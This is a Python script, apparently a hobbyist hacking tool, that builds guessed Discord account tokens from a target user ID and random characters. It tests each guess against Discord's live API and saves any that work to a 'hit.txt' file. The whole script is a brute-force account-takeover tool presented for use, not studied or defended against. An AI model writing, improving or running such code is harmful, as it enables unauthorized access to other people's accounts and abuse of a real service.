import base64
import random
import string
import requests
from colorama import Fore, Style, init
import os
import time

init()

os.system('cls' if os.name == 'nt' else 'clear')
def encode_base64(input_str):
    return base64.urlsafe_b64encode(input_str.encode()).decode().rstrip("=")


def generate_random_string(k):
    characters = string.ascii_letters + string.digits + "-_"
    return ''.join(random.choice(characters) for _ in range(k))


def get_token(user_id):
    token = f"{encode_base64(user_id)}.{generate_random_string(6)}.{generate_random_string(38)}"
    return token


def check_token_validity(token):
    headers = {
        'Authorization': token
    }
    login = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
    try:
        if login.status_code == 200:
            print(f"{Fore.GREEN}[+] VALID {token}{Fore.RESET}")
            with open('hit.txt', "a+") as f:
                f.write(f'{token}\n')
        else:
            print(f"{Fore.RED}[-] INVALID {token}{Fore.RESET}")
    except:
        print(f"{Fore.RED}[-] ERROR OCCURRED {token}")

print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} {Fore.BLUE}AR{Fore.WHITE}MR <3")
time.sleep(3)
os.system('cls' if os.name == 'nt' else 'clear')
num_tokens_to_generate = int(input(
    f"{Fore.BLUE}[$]{Style.RESET_ALL}    How many tokens: "))
user_id = input(
    f"{Fore.BLUE}[$]{Style.RESET_ALL}    User ID: ")
os.system('cls' if os.name == 'nt' else 'clear')

for _ in range(num_tokens_to_generate):
    token = get_token(user_id)
    check_token_validity(token)
print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Finished bruteforce\n{Fore.CYAN}[$]{Style.RESET_ALL}    Press Enter to exit..")
input()
